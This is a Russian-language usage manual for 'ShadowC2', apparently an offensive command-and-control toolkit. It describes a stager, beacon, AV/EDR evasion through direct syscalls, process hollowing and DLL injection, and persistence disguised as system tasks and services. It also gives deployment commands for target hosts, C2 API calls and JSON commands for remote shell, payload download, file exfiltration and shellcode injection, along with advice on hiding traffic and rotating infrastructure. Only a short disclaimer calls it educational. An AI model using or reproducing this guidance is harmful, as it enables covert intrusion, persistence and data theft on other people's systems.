# ShadowC2 Toolkit - Руководство по использованию

## Обзор

ShadowC2 - это продвинутый toolkit для создания недетектируемых C2 (Command & Control) решений. Toolkit включает в себя стейджер, лоадер, beacon-агент и полноценный C2 сервер.

## Архитектура

### Компоненты

1. **Stager (стейджер)** - Мини-загрузчик размером <50KB для первоначальной загрузки
2. **Loader (лоадер)** - Компонент для обхода AV/EDR через direct syscalls
3. **Beacon (маяк)** - Основной агент для постоянного взаимодействия с C2 сервером
4. **Persistence** - Механизмы персистентности через WMI и Scheduled Tasks
5. **C2 Server** - Python сервер для управления агентами

### Методы обхода защиты

- **Direct System Calls** - Обход user-mode hooks в NTDLL
- **Process Hollowing** - Выполнение пейлоада в контексте легитимного процесса
- **DLL Injection** - Инъекция в доверенные процессы
- **Anti-Analysis** - Обнаружение VM и sandbox
- **Living Off The Land** - Использование легитимных системных инструментов

## Установка

### Требования

- Python 3.7+
- CMake 3.10+
- GCC/G++ компилятор
- OpenSSL (для генерации сертификатов)
- UPX (опционально, для пакования)

### Установка зависимостей

```bash
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install -y cmake gcc g++ python3 python3-pip openssl libssl-dev upx-ucl

# CentOS/RHEL
sudo yum install -y cmake gcc gcc-c++ python3 python3-pip openssl openssl-devel

# macOS
brew install cmake gcc python3 openssl upx
```

### Установка Python зависимостей

```bash
cd server
pip3 install -r requirements.txt
```

## Сборка

### Полная сборка

```bash
python3 scripts/build.py
```

### Сборка только стейджера

```bash
python3 scripts/build.py --stager-only
```

### Параметры сборки

- `--clean` - Очистка директории сборки
- `--stager-only` - Сборка только стейджера
- `--no-pack` - Отключение пакования UPX
- `--debug` - Режим отладки

## Использование

### 1. Настройка сервера

#### Генерация SSL сертификатов

```bash
cd server
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

#### Настройка конфигурации

Отредактируйте `server/config.json`:

```json
{
  "server": {
    "host": "your-server.com",
    "port": 443,
    "use_ssl": true
  },
  "beacon": {
    "interval": 30,
    "jitter": 25
  }
}
```

#### Запуск сервера

```bash
python3 scripts/run_server.py --host 0.0.0.0 --port 8443
```

### 2. Развертывание агента

#### Метод 1: Использование стейджера

1. Загрузите стейджер на целевую систему
2. Запустите стейджер - он автоматически загрузит основной пейлоад

```bash
# На целевой системе
svchost.exe
```

#### Метод 2: Использование полного агента

1. Скопируйте `shadowc2.exe` на целевую систему
2. Запустите с параметрами:

```bash
# Режим beacon
shadowc2.exe --beacon

# С установкой персистентности
shadowc2.exe --persist

# С конкретным методом выполнения
shadowc2.exe --method direct
```

### 3. Управление через веб-интерфейс

Откройте браузер и перейдите по адресу сервера:

```
https://your-server.com:8443
```

#### Доступные действия:

- Просмотр активных beacon
- Отправка команд
- Загрузка файлов
- Установка персистентности
- Мониторинг результатов

### 4. Отправка команд

#### Через веб-интерфейс

1. Выберите beacon из списка
2. Введите команду в поле ввода
3. Нажмите "Send Command"

#### Через API

```python
import requests

# Отправка команды
response = requests.post('https://your-server.com:8443/api/commands?beacon_id=BEACON_ID', 
    json={
        'type': 'shell',
        'data': {'command': 'whoami'}
    })

print(response.json())
```

## Команды

### Shell Commands

```json
{
  "type": "shell",
  "data": {
    "command": "whoami /all"
  }
}
```

### File Download

```json
{
  "type": "download",
  "data": {
    "url": "https://example.com/file.exe",
    "path": "C:\\Windows\\Temp\\file.exe"
  }
}
```

### File Upload

```json
{
  "type": "upload",
  "data": {
    "local_path": "C:\\Windows\\Temp\\data.txt"
  }
}
```

### Persistence

```json
{
  "type": "persist",
  "data": {
    "method": "wmi"
  }
}
```

### Process Injection

```json
{
  "type": "inject",
  "data": {
    "target_pid": 1234,
    "payload": "shellcode"
  }
}
```

### Sleep Configuration

```json
{
  "type": "sleep",
  "data": {
    "interval": 60,
    "jitter": 30
  }
}
```

## Методы выполнения

### Direct Syscalls (метод 0)

- Использует direct syscalls для обхода user-mode hooks
- Требует прав администратора
- Наиболее скрытный метод

### Process Hollowing (метод 1)

- Выполняет пейлоад в контексте svchost.exe
- Работает без прав администратора
- Хорошая маскировка

### DLL Injection (метод 2)

- Инъекция в процесс explorer.exe
- Стабильная работа
- Трудно обнаружить

## Методы персистентности

### WMI Events

Создает подписку на WMI события для автоматического запуска:

```
SELECT * FROM __InstanceModificationEvent WITHIN 60 
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
```

### Scheduled Tasks

Создает задачу в планировщике Windows:

- Запуск при входе в систему
- Периодический запуск каждый час
- Маскировка под системную задачу

### Registry Run Keys

Добавляет запись в реестр:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### Windows Service

Создает службу Windows (требуются права администратора):

- Автоматический запуск
- Выполнение от SYSTEM
- Маскировка под системную службу

## Безопасность

### Шифрование

- TLS 1.3 для всех сетевых соединений
- Шифрование данных на уровне приложения
- Ротация ключей шифрования

### Аутентификация

- Проверка SSL сертификатов
- Подпись данных
- Валидация beacon ID

### Обфускация

- Случайные имена переменных
- Полиморфный код
- Anti-disassembly техники

## Мониторинг

### Логирование

Сервер ведет логи:
- Все beacon запросы
- Выполненные команды
- Ошибки и исключения
- Статистика использования

### Метрики

- Количество активных beacon
- Время отклика
- Успешность выполнения команд
- Обнаружение AV/EDR

## Устранение неполадок

### Общие проблемы

1. **Сервер не запускается**
   - Проверьте SSL сертификаты
   - Убедитесь, что порт не занят
   - Проверьте права на директории

2. **Beacon не подключается**
   - Проверьте сетевое соединение
   - Убедитесь в правильности конфигурации
   - Проверьте брандмауэр

3. **Команды не выполняются**
   - Проверьте права пользователя
   - Убедитесь, что команда корректна
   - Проверьте логи сервера

### Отладка

Включите режим отладки:

```bash
python3 scripts/run_server.py --debug
```

Проверьте логи:

```bash
tail -f shadowc2.log
```

## Рекомендации по использованию

### Операционная безопасность

1. Используйте выделенные серверы для C2
2. Регулярно меняйте IP адреса и домены
3. Используйте прокси и VPN
4. Шифруйте все коммуникации

### Эвакуация

1. Используйте jitter для маскировки трафика
2. Разнообразьте интервалы beacon
3. Используйте легитимные User-Agent строки
4. Маскируйтесь под обычный HTTPS трафик

### Поддержка

Для технической поддержки и обновлений следите за репозиторием проекта.

## Лицензия

Этот toolkit создан в образовательных целях для тестирования безопасности. Используйте только на системах, где у вас есть разрешение.

## Отказ от ответственности

Авторы не несут ответственности за любой ущерб, вызванный использованием этого toolkit. Пользователи несут полную ответственность за свои действия.